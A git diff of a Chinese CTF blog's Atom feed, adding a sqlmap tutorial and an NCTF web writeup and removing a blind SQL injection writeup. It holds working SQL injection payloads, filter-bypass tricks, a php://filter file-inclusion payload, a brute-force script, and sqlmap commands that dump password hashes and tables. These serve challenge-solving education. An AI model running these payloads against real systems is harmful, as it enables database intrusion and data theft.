@@ -1,4 +1,275 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-08-16T19:19:17+08:00</updated><id>http://localhost:4000/</id><title type="html">Evil</title><subtitle>Catcher's blog</subtitle><author><name>Catcher</name></author><entry><title type="html">never give up(Bugku)</title><link href="http://localhost:4000/2018/08/13/bk_ng/" rel="alternate" type="text/html" title="never give up(Bugku)" /><published>2018-08-13T00:00:00+08:00</published><updated>2018-08-13T00:00:00+08:00</updated><id>http://localhost:4000/2018/08/13/bk_ng</id><content type="html" xml:base="http://localhost:4000/2018/08/13/bk_ng/">&lt;p&gt;Bugku 上一道比较简单的 web 题目，但是仍然有单独拿出来看看的价值。&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-08-17T20:13:03+08:00</updated><id>http://localhost:4000/</id><title type="html">Evil</title><subtitle>Catcher's blog</subtitle><author><name>Catcher</name></author><entry><title type="html">sqlmap系列(一)</title><link href="http://localhost:4000/2018/08/17/slmap1/" rel="alternate" type="text/html" title="sqlmap系列(一)" /><published>2018-08-17T00:00:00+08:00</published><updated>2018-08-17T00:00:00+08:00</updated><id>http://localhost:4000/2018/08/17/slmap1</id><content type="html" xml:base="http://localhost:4000/2018/08/17/slmap1/">&lt;p&gt;抛开场景来谈应用都是在瞎扯，在这里我就打算记录一下各个场景下 sqlmap 的使用。&lt;/p&gt;
+
+&lt;!--more--&gt;
+
+&lt;h2 id=&quot;0x01-场景&quot;&gt;0x01 场景&lt;/h2&gt;
+
+&lt;p&gt;nctf 上的一道宽字节注入的&lt;a href=&quot;http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1&quot;&gt;题目&lt;/a&gt;&lt;br /&gt;
+题目既然都提示的这么清楚了，直接尝试宽字节注入(&lt;code class=&quot;highlighter-rouge&quot;&gt;%df&lt;/code&gt;):&lt;/p&gt;
+
+&lt;p&gt;step1:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;index.php?id=%df%27 union select 1,2%23
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;step2:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;index.php?id=%df%27 union select 1,table_name from information_schema.tables where table_schema=database() limit 1,1%23
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;后面都是常规的套路了，没啥可说的，找字段然后查询目标数据。但是这里的问题就出在查询目标数据上了，这里的注入的目的不是找到管理员的账号和密码，而是要找到 flag，要找 flag 的话，就要找到 flag 字段，找 flag 字段除了尝试(暴力破解)没有什么好的办法。&lt;/p&gt;
+
+&lt;p&gt;故这里废话不多说了，要么用脚本，要么用 sqlmap，这里选择用 sqlmap。&lt;/p&gt;
+
+&lt;h2 id=&quot;0x02-过程&quot;&gt;0x02 过程&lt;/h2&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python sqlmap.py -u &quot;http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df%27&quot; --search -C flag --level 3 --risk 1 --thread 10
+
+--search C flag //后面跟参数 -D -T -C 搜索列（S），表（S）和/或数据库名称（S）
+--level 3       //sqlmap默认测试所有的GET和POST参数，当--level的值大于等于2的时候也会测试HTTP Cookie头的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。最高可到5
+--risk 3        // 执行测试的风险（0-3，默认为1）risk越高，越慢但是越安全
+--threads 10    //如果你玩过 msfconsole的话会对这个很熟悉 sqlmap线程最高设置为10
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~/Desktop/weapons/sqlmap  python sqlmap.py -u &quot;http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df%27&quot; --search -C flag --level 3 --risk 1 --thread 10
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.2#stable}
+|_ -| . [.]     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V          |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 11:17:56
+
+[11:17:56] [WARNING] it appears that you have provided tainted parameter values ('id=1%df'') with most likely leftover chars/statements from manual SQL injection test(s). Please, always use only valid parameter values so sqlmap could be able to run properly
+are you really sure that you want to continue (sqlmap could have problems)? [y/N] y
+·
+·
+·
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (3) and risk (1) values? [Y/n] n
+·
+·
+·
+injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] y
+[11:19:04] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
+[11:19:04] [INFO] testing 'Generic UNION query (48) - 21 to 40 columns'
+[11:19:09] [INFO] testing 'Generic UNION query (48) - 41 to 60 columns'
+[11:19:14] [INFO] testing 'MySQL UNION query (48) - 1 to 20 columns'
+[11:19:17] [INFO] testing 'MySQL UNION query (48) - 21 to 40 columns'
+[11:19:21] [INFO] testing 'MySQL UNION query (48) - 41 to 60 columns'
+[11:19:26] [INFO] checking if the injection point on GET parameter 'id' is a false positive
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+sqlmap identified the following injection point(s) with a total of 187 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1%df' AND 8950=8950-- dURB
+
+    Type: AND/OR time-based blind
+    Title: MySQL &amp;gt;= 5.0.12 AND time-based blind
+    Payload: id=1%df' AND SLEEP(5)-- Gkws
+---
+[11:19:37] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL &amp;gt;= 5.0.12
+do you want sqlmap to consider provided column(s):
+[1] as LIKE column names (default)
+[2] as exact column names
+&amp;gt; 1
+[11:20:11] [INFO] searching columns LIKE 'flag' across all databases
+[11:20:11] [INFO] fetching number of databases with tables containing columns LIKE 'flag' across all databases
+[11:20:11] [INFO] retrieved: 1
+[11:20:12] [INFO] retrieving the length of query output
+[11:20:12] [INFO] retrieved: 14
+[11:20:19] [INFO] retrieved: sae-chinalover             
+[11:20:19] [INFO] fetching number of tables containing columns LIKE 'flag' in database 'sae-chinalover'
+[11:20:19] [INFO] retrieved: 1
+[11:20:20] [INFO] retrieving the length of query output
+[11:20:20] [INFO] retrieved: 4
+[11:20:23] [INFO] retrieved: ctf4           
+[11:20:23] [INFO] fetching columns LIKE 'flag' for table 'ctf4' in database 'sae-chinalover'
+[11:20:23] [INFO] retrieved: 1
+[11:20:25] [INFO] retrieving the length of query output
+[11:20:25] [INFO] retrieved: 4
+[11:20:28] [INFO] retrieved: flag           
+columns LIKE 'flag' were found in the following databases:
+Database: sae-chinalover
+Table: ctf4
+[1 column]
++--------+
+| Column |
++--------+
+| flag   |
++--------+
+
+do you want to dump entries? [Y/n] y
+which database(s)?
+[a]ll (default)
+[sae-chinalover]
+[q]uit
+&amp;gt; 
+which table(s) of database 'sae-chinalover'?
+[a]ll (default)
+[ctf4]
+[s]kip
+[q]uit
+&amp;gt; 
+[11:21:10] [INFO] fetching entries of column(s) 'flag' for table 'ctf4' in database 'sae-chinalover'
+[11:21:10] [INFO] fetching number of column(s) 'flag' entries for table 'ctf4' in database 'sae-chinalover'
+[11:21:10] [INFO] retrieved: 1
+[11:21:12] [INFO] retrieving the length of query output
+[11:21:12] [INFO] retrieved: 15
+[11:21:18] [INFO] retrieved: nctf{gbk_3sqli}             
+Database: sae-chinalover
+Table: ctf4
+[1 entry]
++-----------------+
+| flag            |
++-----------------+
+| nctf{gbk_3sqli} |
++-----------------+
+
+[11:21:18] [INFO] table '`sae-chinalover`.ctf4' dumped to CSV file '/Users/yangpeng/.sqlmap/output/chinalover.sinaapp.com/dump/sae-chinalover/ctf4.csv'
+[11:21:18] [INFO] fetched data logged to text files under '/Users/yangpeng/.sqlmap/output/chinalover.sinaapp.com'
+
+[*] shutting down at 11:21:18
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;0x03-常用&quot;&gt;0x03 常用&lt;/h2&gt;
+
+&lt;p&gt;来自：&lt;a href=&quot;http://www.youtube.com/user/inquisb/videos&quot;&gt;http://www.youtube.com/user/inquisb/videos&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;1.Extensively fingerprint the back-end database management system, enumerate banner, session user, current database, users, users’ password hashes and databases&lt;/strong&gt;&lt;br /&gt;
+version: 0.8&lt;br /&gt;
+target DB: MySQL 5.1&lt;br /&gt;
+target web application: Apache 2.2 / PHP 5.2&lt;br /&gt;
+targte OS: Debian GNU/Linux 5.0&lt;br /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python sqlmap &quot;http://xxx/test.php?id=1&quot; -f -b --current-user --current-db --users --passwords --dbs -v 0 
+
+-u 		        //目标地址
+-f              //执行检查广泛的DBMS版本指纹
+-b              //检索数据库管理系统的标识
+--current-user  //当前数据库用户
+--current-db    //网站当前数据库
+--users         //所有数据库用户
+--passwords  	//枚举数据库用户密码哈希值
+--dbs           //所有数据库
+-v 		        //详细级别
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;2.Retrieve the database management system banner and enumerate the password hash(es) for database session user via UNION query SQL injection&lt;/strong&gt;&lt;br /&gt;
+version: 0.8&lt;br /&gt;
+target DB: Oracle 10.2 Enterprise Edition&lt;br /&gt;
+target web application: Apache 2.2 / PHP 5.2&lt;br /&gt;
+targte OS: Debian GNU/Linux 5.0&lt;br /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python sqlmap &quot;http://xxx/test.php?id=1&quot; -b --passwords -U CU --union-use -v 2 
+
+-u 		        //目标地址
+-b              //检索数据库管理系统的标识
+--passwords  	//枚举数据库用户密码哈希值
+-U              //指定数据库用户(CU, 当前用户的别名)
+--union-use     //如果可能，通过UNION查询SQL注入检索数据
+-v 		        //详细级别(2, debug)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;3.Dump only from the second to the third entry of column surname of table users&lt;/strong&gt;&lt;br /&gt;
+version: 0.8&lt;br /&gt;
+target DB: SQL Server 2005&lt;br /&gt;
+target web application: IIS6.0 / ASP&lt;br /&gt;
+targte OS: Win2003 Service Pack 2&lt;br /&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python sqlmap &quot;http://xxx/test.asp?name=luther&quot; --dump -T users -C username -D testdb --start 2 --stop 3 -v 2
+
+-u 		//目标地址
+--dump  //提取表中数据
+-T      //目标表
+-C      //目标字段
+--start //要提取的第一个记录
+--stop  //要提取的最后一个记录
+-v 		//详细级别(2, debug)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;0x04-参考&quot;&gt;0x04 参考&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/sqlmapproject/sqlmap/wiki/Usage&quot;&gt;sqlmap document&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;http://www.vuln.cn/1992&quot;&gt;http://www.vuln.cn/1992&lt;/a&gt;&lt;br /&gt;
+乌云知识库还有几篇不错的文章&lt;/p&gt;</content><author><name>Catcher</name></author><category term="sqlmap" /><summary type="html">抛开场景来谈应用都是在瞎扯，在这里我就打算记录一下各个场景下 sqlmap 的使用。</summary></entry><entry><title type="html">NCTF writeup(WEB)</title><link href="http://localhost:4000/2018/08/16/nctf/" rel="alternate" type="text/html" title="NCTF writeup(WEB)" /><published>2018-08-16T00:00:00+08:00</published><updated>2018-08-16T00:00:00+08:00</updated><id>http://localhost:4000/2018/08/16/nctf</id><content type="html" xml:base="http://localhost:4000/2018/08/16/nctf/">&lt;p&gt;这篇是南邮 CTF web 题目的 writeup，写在这里作为记录。持续更新……&lt;/p&gt;
+
+&lt;!--more--&gt;
+
+&lt;h2 id=&quot;1签到题&quot;&gt;1.签到题&lt;/h2&gt;
+
+&lt;p&gt;查看源码(签到题似乎都是从查看源码开始)&lt;/p&gt;
+
+&lt;h2 id=&quot;2md5-collision&quot;&gt;2.md5 collision&lt;/h2&gt;
+
+&lt;p&gt;&lt;strong&gt;payload:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/web19/?a=240610708
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;3签到2&quot;&gt;3.签到2&lt;/h2&gt;
+
+&lt;p&gt;&lt;strong&gt;tips:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;改 &lt;code class=&quot;highlighter-rouge&quot;&gt;maxlength&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;4这题不是web&quot;&gt;4.这题不是WEB&lt;/h2&gt;
+
+&lt;p&gt;猫腻在图片了&lt;/p&gt;
+
+&lt;h2 id=&quot;5层层递进&quot;&gt;5.层层递进&lt;/h2&gt;
+
+&lt;p&gt;扫目录 get &lt;code class=&quot;highlighter-rouge&quot;&gt;404.html&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;查看源码，源码里面有猫腻，需要仔细才能搞到 flag&lt;/p&gt;
+
+&lt;h2 id=&quot;6aaencode&quot;&gt;6.AAencode&lt;/h2&gt;
+
+&lt;p&gt;下载下来直接拿去解密就好了&lt;/p&gt;
+
+&lt;h2 id=&quot;7单身二十年&quot;&gt;7.单身二十年&lt;/h2&gt;
+
+&lt;p&gt;burpsuite 抓包(对于这种有链接跳转的，基本都要用 burp 抓包)&lt;/p&gt;
+
+&lt;h2 id=&quot;8php-decode&quot;&gt;8.php decode&lt;/h2&gt;
+
+&lt;p&gt;代码运行一下，&lt;code class=&quot;highlighter-rouge&quot;&gt;return&lt;/code&gt; -&amp;gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;echo&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;9文件包含&quot;&gt;9.文件包含&lt;/h2&gt;
+
+&lt;p&gt;&lt;strong&gt;payload&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;?file=php://filter/convert.base64-encode/resource=index.php
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;10单身一百年也没用&quot;&gt;10.单身一百年也没用&lt;/h2&gt;
+
+&lt;p&gt;burpsuite 抓包&lt;/p&gt;
+
+&lt;h2 id=&quot;11download&quot;&gt;11.Download~!&lt;/h2&gt;
+
+&lt;p&gt;&amp;lt;font color=red&amp;gt;貌似是题目坏掉了，题目无法访问&amp;lt;/font&amp;gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;12cookie&quot;&gt;12.COOKIE&lt;/h2&gt;
+
+&lt;p&gt;&lt;strong&gt;tips:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;改下 cookie&lt;/p&gt;
+
+&lt;h2 id=&quot;13mysql&quot;&gt;13.MYSQL&lt;/h2&gt;
+
+&lt;p&gt;intval函数向下取整，1024.1&lt;/p&gt;
+
+&lt;h2 id=&quot;14gbk-injection&quot;&gt;14.GBK Injection&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://pengyang.me/2018/08/17/slmap1/&quot;&gt;https://pengyang.me/2018/08/17/slmap1/&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;15&quot;&gt;15.&lt;/h2&gt;</content><author><name>Catcher</name></author><category term="CTF" /><summary type="html">这篇是南邮 CTF web 题目的 writeup，写在这里作为记录。持续更新……</summary></entry><entry><title type="html">never give up(Bugku)</title><link href="http://localhost:4000/2018/08/13/bk_ng/" rel="alternate" type="text/html" title="never give up(Bugku)" /><published>2018-08-13T00:00:00+08:00</published><updated>2018-08-13T00:00:00+08:00</updated><id>http://localhost:4000/2018/08/13/bk_ng</id><content type="html" xml:base="http://localhost:4000/2018/08/13/bk_ng/">&lt;p&gt;Bugku 上一道比较简单的 web 题目，但是仍然有单独拿出来看看的价值。&lt;/p&gt;
 
 &lt;!--more--&gt;
 
@@ -659,7 +930,7 @@ $ git commit -m &quot;XXX&quot;
 $ git push
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;h2 id=&quot;2-提交本地文件&quot;&gt;2. 提交本地文件&lt;/h2&gt;
+&lt;h3 id=&quot;2-提交本地文件&quot;&gt;2. 提交本地文件&lt;/h3&gt;
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ cd ~/Code/test
 $ git init
@@ -675,8 +946,11 @@ $ git push -u origin master
 $ git checkout master   将当前分支切换到 master 分支上
 $ git checkout -b new-test   将会为你创建一个名为 new-test 的新分支
 
-$ git merge new-test
-$ git branch -d new-test   //删除分支
+----
+$ git checkout master		//切换到主分支
+$ git merge new-test		//合并分支
+$ git branch -d new-test    //删除分支
+----
 
 $ git branch -l   //查看本地分支
 $ git branch -r   //查看远程分支
@@ -685,14 +959,14 @@ $ git branch -r   //查看远程分支
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ git commit -m &quot;last&quot;
 XXX---&amp;gt;中间经历若干操作
 $ git add -A
-$ git checkout -f   放弃中间经历的若干操作，回到上次 commit 的地方
+$ git checkout -f   //放弃中间经历的若干操作，回到上次 commit 的地方
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h3 id=&quot;3打标签发布&quot;&gt;3.打标签发布&lt;/h3&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ git tag v0.1-alpha   #创建轻量标签
-$ git push origin --tags   #把所有不在远程仓库服务器上的标签全部传送到那里
-$ git tag   #在 Git 中列出已有的标签
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ git tag v0.1-alpha   //创建轻量标签
+$ git push origin --tags   //把所有不在远程仓库服务器上的标签全部传送到那里
+$ git tag   //在 Git 中列出已有的标签
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h3 id=&quot;参考&quot;&gt;参考：&lt;/h3&gt;
@@ -1261,300 +1535,4 @@ Duplicate column name '5.5.53'
 
 &lt;hr /&gt;
 
-&lt;p&gt;村上这本书给我的感觉是「这何止是在写跑步，分明在写生活呀！」&lt;/p&gt;</content><author><name>Catcher</name></author><category term="读书" /><summary type="html">“每天跑步对我来说好比生命线，不能说忙就抛开不管，或者停下不跑了。忙就中断跑步的话，我一辈子都无法跑步了。坚持跑步的理由不过一丝半点，中断跑步的理由却足够装满一辆大型载重卡车。我们只有将那「一丝半点的理由」一个个慎之又慎地不断打磨，见缝插针，得空就孜孜不倦地打磨他们。” —村上春树</summary></entry><entry><title type="html">login3(SKCTF)</title><link href="http://localhost:4000/2018/08/05/bk_login3/" rel="alternate" type="text/html" title="login3(SKCTF)" /><published>2018-08-05T00:00:00+08:00</published><updated>2018-08-05T00:00:00+08:00</updated><id>http://localhost:4000/2018/08/05/bk_login3</id><content type="html" xml:base="http://localhost:4000/2018/08/05/bk_login3/">&lt;p&gt;一道 SQL 注入的题目，里面有不少绕过的技巧，值得好好来分析一下。&lt;/p&gt;
-
-&lt;!--more--&gt;
-
-&lt;h2 id=&quot;0x01-题目&quot;&gt;0x01 题目&lt;/h2&gt;
-
-&lt;p&gt;&lt;a href=&quot;http://ctf.bugku.com/challenges&quot;&gt;题目链接&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/blog/bk_log3.png&quot; alt=&quot;多次&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;0x02-解答&quot;&gt;0x02 解答&lt;/h2&gt;
-
-&lt;h3 id=&quot;step1尝试&quot;&gt;step1:尝试&lt;/h3&gt;
-
-&lt;p&gt;拿到这种题目首先就是测试一下输入，我一般是用&lt;code class=&quot;highlighter-rouge&quot;&gt;admin admin&lt;/code&gt;作为用户名和密码来测试，此时回显&lt;code class=&quot;highlighter-rouge&quot;&gt;password error!&lt;/code&gt;也就是用户名是存在的，只是密码错误。&lt;/p&gt;
-
-&lt;p&gt;然后测试一下&lt;code class=&quot;highlighter-rouge&quot;&gt;123 admin&lt;/code&gt;，回显的是&lt;code class=&quot;highlighter-rouge&quot;&gt;username does not exist!&lt;/code&gt;。这说明了啥呢？说明了在后台是对用户名进行查询了的，我们不妨猜测一下后台的 SQL 语句:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;select username, password from users where username='XXX'
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;根据以上分析，我们其实可以根据回显的不同进行布尔盲注。&lt;/p&gt;
-
-&lt;h3 id=&quot;step2-布尔盲注测试&quot;&gt;step2: 布尔盲注测试&lt;/h3&gt;
-
-&lt;p&gt;在进行布尔盲注测试的时候会发现这里过滤了一些字符(回显为&lt;code class=&quot;highlighter-rouge&quot;&gt;illegal character&lt;/code&gt;)，这里过滤了&lt;code class=&quot;highlighter-rouge&quot;&gt;and 空格 逗号 等号 for information&lt;/code&gt;。这里最精华的地方就是对这些过滤进行绕过：&lt;/p&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;and&lt;/code&gt; &amp;lt;—&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;^&lt;/code&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;等号&lt;/code&gt; &amp;lt;—&amp;gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;&amp;gt;&lt;/code&gt;（这里也可以用减号，看相减之后是否为 0，然后进行异或）&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;mid(xxx,from 1 for 1)&lt;/code&gt; (for 和逗号被过滤)&amp;lt;—&amp;gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ascii()&lt;/code&gt;(如果传入一个字符串那么就会取第一个字符的ascii码值)&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;下面就是按照 SQL 注入的一般套路来：&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;1.先查询数据库名&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;admin'^(ascii(mid(database()from(1)))&amp;lt;&amp;gt;1)#
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;strong&gt;注：&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mid() 和 substring() 相同:
-mid(xxx,1,1)
-mid(xxx,from 1 for 1)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;根据以上分析，我们可以构造暴破数据库名的脚本，首先 payload 为：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;admin'^(ascii(mid(database()from(1)))&amp;lt;&amp;gt;1)^0#
-或
-admin'^(ascii(mid(database()from(1)))&amp;lt;&amp;gt;1)#
-或
-admin'^(ascii(substring(database()from(1)))&amp;lt;&amp;gt;1)#
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#encoding: utf-8&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;string&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;rq&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;base_url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;http://118.89.219.210:49167/index.php&quot;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;digits&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lowercase&lt;/span&gt;
-
-&lt;span class=&quot;c&quot;&gt;# payload = &quot;admin'^(ascii(mid(database()from(1)))&amp;lt;&amp;gt;1)^0#&quot;&lt;/span&gt;
-
-
-&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_database&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;database&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-		&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
-		&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-			&lt;span class=&quot;c&quot;&gt;#上面三个 payload 任意一个都行&lt;/span&gt;
